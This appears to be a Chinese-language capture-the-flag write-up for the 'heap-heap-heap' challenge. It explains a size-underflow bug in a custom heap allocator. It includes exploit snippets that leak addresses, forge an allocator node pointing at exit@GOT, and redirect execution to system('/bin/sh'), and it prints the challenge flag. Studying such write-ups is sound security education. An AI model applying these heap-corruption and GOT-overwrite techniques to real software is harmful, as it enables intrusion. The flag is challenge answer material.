# heap-heap-heap

## 题目简述

程序在固定 0x1000 字节 `.bss` 数组上实现自定义分配器，并用另一棵指针型最大堆管理空闲块；应用本身又用同一种 `Node` 构建最大堆。元数据与用户数据相邻且不做对齐。分块算法没有检查剩余空间能否容纳 40 字节节点头，可制造整数下溢、重叠节点，最终形成任意地址分配。

## 解题过程

`halloc()` 从最大空闲块切出请求大小后，无条件计算：

```c
struct Node *new_node = node->data + size;
new_node->data = (void *)new_node + NODE_SIZE;
new_node->value = old_size - NODE_SIZE - size;
insert(&heap_heap.heap, new_node);
```

当 `old_size > size` 但差值小于 `NODE_SIZE = 40` 时，`new_node->value` 以 `size_t` 下溢为一个巨大值。新节点头还会跨入相邻区域，后续最大堆操作便把重叠元数据当作合法指针结构。

官方利用先按以下顺序整理布局：

```python
add(b"aaa", 1000, 1337)
add(b"bbb",   40, 1336)
edit(b"aaa", 400, 1335)
edit(b"bbb", 560, 1334)
edit(b"aaa", 384, 1333)  # 400 - 40 - 384 下溢
add(b"ccc",    10, 1300)
edit(b"bbb",   10, 1330)
```

最后一次 `400 -> 384` 分割产生重叠的巨大空闲节点。应用每轮会打印最大堆中的 `value`；被元数据覆盖后，其中一个 value 实际变成 `.bss` 堆地址。减去固定布局偏移 `0x4b0` 得到自定义内存数组基址，再由 `mem` 符号相对偏移还原 PIE 基址。

有了基址后，在一次 1000 字节编辑中重建仍需保持可遍历的原节点，并伪造一个分配器节点。关键字段令其 `value` 极大、`data = exit@GOT`：

```python
fake = p64(0xffffffffffffffff)
fake += p64(heap_base + 0x208)  # left
fake += p64(0)                  # right
fake += p64(heap_base + 0x6bc)  # parent
fake += p64(elf.got.exit)       # data
```

继续调整应用堆根，使下一次 `halloc(8)` 取到这个伪节点，于是返回地址就是 `exit@GOT`。写入 `backdoor` 地址后，程序下一次调用 `exit()` 会转入 `system("/bin/sh")`，得到：

```text
grey{h34p5_0f_h34p_f0r_m4x1mum_c0nfu510n}
```

## 方法总结

决定性缺陷是自定义 allocator 的 split 条件错误：不仅要检查空闲块大于请求，还要保证余量至少能容纳元数据和最小有效块。由于空闲堆与业务堆使用相同的指针节点格式，单次重叠会在两个数据结构间传播。分析这类题时，按每次分配记录“头地址、data、size、树指针”，比只看菜单操作更容易找出可控重叠和泄露来源。
